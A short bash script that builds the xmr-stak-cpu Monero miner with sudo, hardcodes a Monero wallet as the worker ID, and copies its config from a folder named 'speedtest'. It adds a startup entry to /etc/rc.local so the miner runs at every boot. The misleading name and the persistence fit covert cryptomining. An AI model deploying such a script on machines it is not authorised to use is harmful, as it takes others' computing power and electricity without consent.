#!/bin/bash
sudo apt-get --assume-yes update
sudo apt-get --assume-yes install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev screen git nano
cd /usr/local/src/
sudo git clone https://github.com/fireice-uk/xmr-stak-cpu.git
cd xmr-stak-cpu
sudo cmake .
sudo make install
cd bin/
sudo chmod +x xmr-stak-cpu

worker="48n6t7K3WmTRN8LkrjKVrgG6XFZa4JmyJDqj2WcWPN3W8UM3Q2ZLxKR3yM8Q8vJn8RaVWP83DmyntaGb1oCitW5DGk3cnzX.az"$1
sudo rm config.txt -f
cd ~/speedtest
sudo cp template.txt config.txt
sed -i "s/WORKERNUM/$1/g" config.txt
sudo cp config.txt /usr/local/src/xmr-stak-cpu/bin/config.txt -f

sudo sed -i 'N;14i~/speedtest/startRun.sh' /etc/rc.local 
